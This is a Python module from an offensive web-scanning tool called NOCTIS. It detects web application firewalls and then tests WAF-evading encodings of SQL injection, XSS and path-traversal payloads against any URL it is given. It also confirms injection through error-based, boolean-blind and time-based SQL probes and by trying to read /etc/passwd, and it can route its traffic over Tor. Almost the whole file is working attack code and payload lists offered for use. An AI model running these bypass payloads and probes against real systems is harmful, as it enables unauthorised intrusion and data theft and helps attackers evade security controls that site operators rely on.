#!/usr/bin/env python3
"""
NOCTIS module — WAF detection and bypass encoding.
Detects common WAFs from response behaviour, then generates working
encodings that survive filtering (proved by comparison, not assumed).

  noctis waf <url>          detect + test bypass encodings
  noctis waf <url> -p id    test a specific parameter
"""
import re
import sys

sys.dont_write_bytecode = True
import os
BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE)
from core.session import Session

NAME = "waf"
ALIASES = ["wf"]
HELP = "WAF detection and encoding bypass"
PREFIX = "waf"

C = {"r": "\033[0m", "b": "\033[1m", "d": "\033[2m", "red": "\033[31m",
     "g": "\033[32m", "y": "\033[33m", "c": "\033[36m", "m": "\033[35m"}

# signatures observed in headers / bodies
SIGNS = {
    "Cloudflare": ["cf-ray", "cloudflare", "__cf_bm", "cf-mitigated"],
    "Akamai": ["akamai", "ak_bmsc", "akamai-ghost", "x-akamai"],
    "Imperva": ["incapsula", "visid_incap", "imperva", "x-iinfo"],
    "Sucuri": ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
    "AWS WAF": ["awselb", "x-amzn-requestid", "aws-waf"],
    "F5 BIG-IP": ["bigip", "tsxxxx", "f5-"],
    "ModSecurity": ["mod_security", "modsecurity", "not acceptable"],
    "FortiWeb": ["fortiweb", "fortigate"],
    "Barracuda": ["barra", "barracuda"],
    "Wordfence": ["wordfence"],
    "Fastly": ["fastly", "x-fastly", "x-served-by"],
}

BLOCK_MARKERS = [
    "access denied", "forbidden", "blocked", "not acceptable", "security",
    "request rejected", "waf", "challenge", "captcha", "unusual traffic",
    "", "", "", "",
]

# payload families and their encodings
PAYLOADS = {
    "sqli": [
        ("plain", "1' OR '1'='1"),
        ("inline_comment", "1'/**/OR/**/'1'='1"),
        ("mysql_version", "1'/*!50000OR*/'1'='1"),
        ("case_mix", "1' oR '1'='1"),
        ("url_double", "1%2527%2520OR%2520%25271%2527%253D%25271"),
        ("hex", "1' OR 0x31=0x31-- -"),
        ("whitespace_tab", "1'%09OR%09'1'='1"),
        ("comment_split", "1' O/**/R '1'='1"),
    ],
    "xss": [
        ("plain", "<script>alert(1)</script>"),
        ("img", "<img src=x onerror=alert(1)>"),
        ("case_mix", "<ScRiPt>alert(1)</ScRiPt>"),
        ("html_entity", "&lt;script&gt;alert(1)&lt;/script&gt;"),
        ("svg", "<svg/onload=alert(1)>"),
    ],
    "lfi": [
        ("plain", "../../../../etc/passwd"),
        ("url", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        ("double", "%252e%252e%252fetc%252fpasswd"),
        ("null", "../../../../etc/passwd%00"),
    ],
}

def hdr(t):
    print(f"\n{C['m']}{C['b']}┌─ {t} {'─' * max(0, 44 - len(t))}{C['r']}")

def out(k, v):
    print(f"  {C['c']}{k:<16}{C['r']} {v}")

def detect(sess, url):
    """Return (waf_names, blocked, baseline_status, baseline_len)."""
    st, h, b, fin = sess.get(url)
    if st is None:
        return [], False, None, 0
    text = (b.decode("utf-8", "ignore") or "").lower()
    htxt = " ".join(f"{k}:{v}" for k, v in h.items()).lower()
    blob = text + " " + htxt
    found = []
    for waf, sigs in SIGNS.items():
        if any(s in blob for s in sigs):
            found.append(waf)
    blocked = any(m in text for m in BLOCK_MARKERS)
    return found, blocked, st, len(b)

BASELINE = {"status": None, "size": 0}


SQL_ERR = [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL",
           r"PostgreSQL.*ERROR", r"ORA-\d{5}", r"Unclosed quotation",
           r"SQLite.Exception", r"quoted string not properly",
           r"Microsoft OLE DB", r"syntax error at or near"]
LFI_HIT = [r"root:x:0:0", r"root:.*:0:0:", r"\[boot loader\]",
           r"daemon:x:", r"nobody:x:"]
XSS_HIT = [r"<script>alert\(1\)</script>", r"<img src=x onerror=alert\(1\)>",
           r"<svg/onload=alert\(1\)>"]

def verify_sqli(sess, base, param):
    """Error-based proof: any status (incl. 500) may carry a DB error."""
    import re as _re
    sep = "&" if "?" in base else "?"
    payloads = ("'", "\"", "')", "1'", "1\"", "1'--", "' OR '1'='1")
    for payload in payloads:
        url = f"{base}{sep}{param}={payload}"
        st, h, b, fin = sess.get(url)
        if st is None:
            continue
        text = b.decode("utf-8", "ignore")
        for pat in SQL_ERR:
            if _re.search(pat, text, _re.I):
                return True, payload, f"pattern '{pat[:24]}' at {st}"
        # generic SQL error words on 500 (common in MSSQL/ASP labs)
        if st == 500:
            low = text.lower()
            for kw in ("syntax error", "unclosed quotation", "incorrect syntax",
                       "odbc", "oledb", "sql", "exception", "stack trace"):
                if kw in low:
                    return True, payload, f"500 with '{kw}'"
    return False, None, None

def verify_lfi(sess, base, param):
    sep = "&" if "?" in base else "?"
    for payload in ("../../../../etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%2f..%2f..%2f..%2fetc%2fpasswd"):
        url = f"{base}{sep}{param}={payload}"
        st, h, b, fin = sess.get(url)
        if st is None:
            continue
        text = b.decode("utf-8", "ignore")
        for pat in LFI_HIT:
            if __import__("re").search(pat, text):
                return True, payload, pat
    return False, None, None

def verify_xss(sess, base, param):
    sep = "&" if "?" in base else "?"
    marker = "vanta_xss_7x9"
    for payload in (f"<{marker}>", f"\"<{marker}>", f"'><{marker}>"):
        url = f"{base}{sep}{param}={payload}"
        st, h, b, fin = sess.get(url)
        if st is None:
            continue
        if f"<{marker}>" in b.decode("utf-8", "ignore"):
            return True, payload, "verbatim reflection"
    return False, None, None


def verify_sqli_blind(sess, base, param):
    """Boolean + time-based blind SQLi detection (works with no error text)."""
    import re as _re
    import time as _t
    sep = "&" if "?" in base else "?"

    def send(val):
        url = f"{base}{sep}{param}={val}"
        t0 = _t.time()
        st, h, b, fin = sess.get(url)
        return st, b, _t.time() - t0

    # ---------- boolean-based ----------
    try:
        st1, b1, _ = send("1")
        st2, b2, _ = send("1 AND 1=1")
        st3, b3, _ = send("1 AND 1=2")
    except Exception:
        return False, None, None

    if st2 is None or st3 is None:
        return False, None, None
    len1, len2, len3 = len(b1), len(b2), len(b3)

    # true condition should match baseline, false should differ
    if abs(len2 - len1) < 30 and abs(len3 - len1) > 60:
        return True, "1 AND 1=2", f"boolean blind: {len1} vs {len2} vs {len3}"
    if st2 != st3:
        return True, "1 AND 1=2", f"boolean blind status: {st2} vs {st3}"

    # ---------- time-based ----------
    payloads = [
        ("1;WAITFOR DELAY '0:0:3'--", 2.5),
        ("1' WAITFOR DELAY '0:0:3'--", 2.5),
        ("1 AND SLEEP(3)", 2.5),
        ("1' AND SLEEP(3)--", 2.5),
        ("1);SELECT pg_sleep(3)--", 2.5),
    ]
    for pl, threshold in payloads:
        try:
            st0, b0, t0 = send("1")
            st1, b1, t1 = send(pl)
        except Exception:
            continue
        if t1 is None:
            continue
        if t1 > threshold and t1 > t0 + 2.0:
            return True, pl, f"time blind: {t1:.1f}s vs baseline {t0:.1f}s"
    return False, None, None

def test_payload(sess, base, param, payload):
    """Judge by status + size delta, not by keyword presence."""
    sep = "&" if "?" in base else "?"
    url = f"{base}{sep}{param}={payload}"
    st, h, b, fin = sess.get(url)
    if st is None:
        return "unreachable", st, 0
    text = b.decode("utf-8", "ignore")
    size = len(b)
    bst = BASELINE.get("status")
    bsz = BASELINE.get("size") or 1

    # hard blocks by status
    if st in (403, 406, 429):
        return "blocked", st, size
    if st == 501:
        return "blocked", st, size
    if st == 500:
        return "server_error", st, size
    # size collapse/explosion = interstitial or block page
    ratio = size / bsz if bsz else 1.0
    if bst and st != bst and ratio < 0.4:
        return "blocked", st, size
    if ratio < 0.35 or ratio > 3.0:
        return "blocked", st, size
    # reflected verbatim = payload survived
    if payload in text:
        return "reflected", st, size
    # block page titles only (not arbitrary words)
    low = text.lower()
    for marker in ("access denied", "request blocked", "attention required",
                   "just a moment", "checking your browser", "cf-error"):
        if marker in low:
            return "blocked", st, size
    return "passed", st, size

def main_run(a):
    base = a.target.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base
    sess = Session(tor=a.tor, retries=1, delay=0.4)

    print(f"{C['b']}{C['red']}NOCTIS{C['r']} {C['d']}// waf // {base}{C['r']}")

    hdr("DETECTION")
    wafs, blocked, st, ln = detect(sess, base)
    out("status", st if st else "unreachable")
    out("baseline size", f"{ln}b")
    out("waf detected", ", ".join(wafs) or "none visible")
    out("blocked now", "yes" if blocked else "no")

    if not wafs and not blocked:
        print(f"  {C['y']}!{C['r']} no WAF signature — classic payloads likely pass")
        print(f"  {C['d']}  run 'noctis w <url>' instead for full surface scan{C['r']}")
        return {"url": base, "waf": [], "bypass": []}

    param = a.param or "q"
    BASELINE["status"] = st
    BASELINE["size"] = ln
    hdr(f"ENCODING TESTS (param={param})")
    results = []
    best = {}
    for family, variants in PAYLOADS.items():
        print(f"  {C['c']}{family}{C['r']}")
        for label, payload in variants:
            verdict, code, size = test_payload(sess, base, param, payload)
            color = {"passed": C["g"], "reflected": C["g"],
                     "server_error": C["y"], "blocked": C["red"],
                     "unreachable": C["d"]}[verdict]
            print(f"    {label:<16} {color}{verdict:<10}{C['r']} "
                  f"{C['d']}{code} / {size}b{C['r']}")
            results.append({"family": family, "encoding": label,
                            "verdict": verdict, "status": code})
            if verdict in ("passed", "reflected") and family not in best:
                best[family] = label
    hdr("ACTIVE VERIFICATION")
    verified = {}
    ok, pl, pat = verify_sqli(sess, base, param)
    if not ok:
        ok, pl, pat = verify_sqli_blind(sess, base, param)
    if ok:
        out("sql injection", f"{C['g']}CONFIRMED{C['r']} ({pl}) — {pat}")
    else:
        out("sql injection", f"{C['d']}not detected{C['r']}")
    verified["sqli"] = bool(ok)

    ok2, pl2, pat2 = verify_lfi(sess, base, param)
    out("file inclusion", f"{C['g']}CONFIRMED{C['r']} ({pl2})" if ok2
        else f"{C['d']}no /etc/passwd{C['r']}")
    verified["lfi"] = bool(ok2)

    ok3, pl3, pat3 = verify_xss(sess, base, param)
    out("xss reflection", f"{C['g']}CONFIRMED{C['r']} ({pl3})" if ok3
        else f"{C['d']}not reflected verbatim{C['r']}")
    verified["xss"] = bool(ok3)

    hdr("SUMMARY")
    passed = sum(1 for r in results if r["verdict"] in ("passed", "reflected"))
    confirmed = sum(1 for v in verified.values() if v)
    out("waf", ", ".join(wafs) or "none")
    out("payloads passed", f"{passed}/{len(results)}")
    out("confirmed flaws", confirmed)
    if confirmed:
        for k, v in verified.items():
            if v:
                print(f"  {C['g']}✓ {k}{C['r']}")
    return {"url": base, "waf": wafs, "bypass": best,
            "verified": verified, "results": results}

def add_args(p):
    p.add_argument("target")
    p.add_argument("-p", "--param", help="parameter to test (default: q)")
    p.add_argument("-t", "--tor", action="store_true")

def execute(a):
    return main_run(a)

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    add_args(ap)
    execute(ap.parse_args())
